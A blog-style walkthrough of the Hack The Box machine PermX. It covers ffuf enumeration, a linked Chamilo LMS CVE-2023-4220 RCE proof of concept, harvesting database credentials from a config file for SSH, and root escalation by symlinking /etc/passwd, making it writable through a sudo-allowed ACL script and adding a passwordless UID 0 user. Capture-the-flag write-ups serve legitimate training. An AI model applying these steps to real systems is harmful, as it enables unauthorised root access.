---
layout: post
title: 'PermX Walkthrough: Conquering Hack The Box Machines "PermX htb"'
date: 20-08-2024
categories: [HackTheBox]
tag: machines
image:
  path: '/55img/permx.png'  
---
 ## Introduction

  PermX is a web application penetration testing challenge on HackTheBox, aimed at enhancing cybersecurity skills. The machine features multiple open ports that can be explored using Nmap. Success in this Linux-based challenge requires mastering privilege escalation techniques. Participants may need to obtain an IP address, establish a reverse shell, and navigate security measures. 

## Reconnaissance
 
 __Network Scanning:__ as always, we will do nmap scan to know what is opened ports and it’s services in this machine.as always, we will do nmap scan to know what is opened ports and it’s services in this machine.

 ![](/Images/permx/namp.png)

## Exploration the website

     Visiting the IP address in a browser redirects us to a website named “permx.htb”.


 ![](/Images/permx/oerms.png)

 - i did't found any thing interesting. so i will make directory discovery.

## directory discovery  


 - i will use ffuf tool.

 > ffuf -u http://permx.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt  -mc 200,301,302,401,402,403 -e .php 

 ![](/Images/permx/1fuf.png)

 - no any of this interesting. so i will try to see if we have any subdomain on this site

 > ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.11.23 -H "Host: FUZZ.permx.htb" -mc 200,301,307,401,403,405,500

 ![](/Images/permx/2fuf.png)

 -  Lms and www. Also add these to the ```/etc/hosts``` file

 - now we browse ```"lms.permx.htb"```

 ![](/Images/permx/chamilo.png)

 - do some search about ```chamilo lms 1 exploits ``` . we found "CVE-2023-4220"

 ![](/Images/permx/ss.png)

 

## Exploit 

 - go to [github](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc) and follow the steps to do ```RCE```

 ![](/Images/permx/bz1.png)

 ![](/Images/permx/bz2.png)

## User Flag

 - i try to go home and get the flag put."Permission denied"

 ! [](/Images/permx/mtz.png)

 - i will search in the application try to find any interesting data..

 > cd /var/www/chamilo/ ; ls 

 ![](/Images/permx/yu.png)

 ![](/Images/permx/conf0.png) 

 - now i will download and see if i found any __sensitive__ data

 ![](/Images/permx/conf1.png)

 ![](/Images/permx/conf2.png)

 - and BOOM!!

 ![](/Images/permx/databb.png)

 - now try to connect with this data to ssh and use 'mtz' as user

 > ssh mtz@10.10.11.23

 ![](/Images/permx/user.png)

## Privilege Escalation 

 - try "sudo -l"

 ![](/Images/permx/sudo-l.png)

 ![](/Images/permx/aa.png)

 - explore the script 

 ![](/Images/permx/ffq.png)

 - let's try to add new user with root access. link "/etc/passwd"file with any file and give the file read and write permisiion by "acl.sh" script.

 
 * link /etc/passwd by hu1ko file
 > ln -s /etc/passwd /home/mtz/hu1ko   

 * run the script.
 > sudo /opt/acl.sh mtz rw /home/mtz/hu1ko  

 * to see how we will add an new user 
 > cat /etc/passwd                          
 ```` 
 root:x:0:0:root:/root:/bin/bash   <== 
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 sync:x:4:65534:sync:/bin:/bin/sync
 games:x:5:60:games:/usr/games:/usr/sbin/nologin
 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
 mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin

 ````
 - ask ```chatgpt``` about it .

 ![](/Images/permx/gpt.png)

 - so it will be . "user::0:0:user:/root:/bin/bash"

 > nano hu1ko // to add new user or can use echo 
 
 ![](/Images/permx/hu1.png) 

 ![](/Images/permx/roooot.png)

---

![](/Images/permx/1.png)